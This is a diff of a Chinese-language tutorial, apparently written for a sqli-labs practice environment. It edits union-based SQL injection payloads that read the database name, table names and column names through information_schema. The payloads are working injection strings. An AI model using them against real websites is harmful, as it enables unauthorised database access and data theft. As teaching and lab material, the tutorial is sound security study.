@@ -27,7 +27,7 @@ id=-1' union select 1,2,3    查看页面显示1,2,3的位置，即显示位
 ```
 **-- （5）获取数据库名**
  ```python
-id=-1' union select 1,database(),3--+      我们得出了数据库名叫security
+id=-1' union select 1,database(),3      我们得出了数据库名叫security
 ```
 **-- （6）获取数据库表名**
  ```python
@@ -35,7 +35,7 @@ id=-1' union select 1,(select table_name from information_schema.tables where ta
 ```
 **-- （7）获取数据库表中所有字段**
  ```python
-id=-1'union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),3
+id=-1' union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),3
 ```
 **-- （8）获取字段中数据**
  ```python
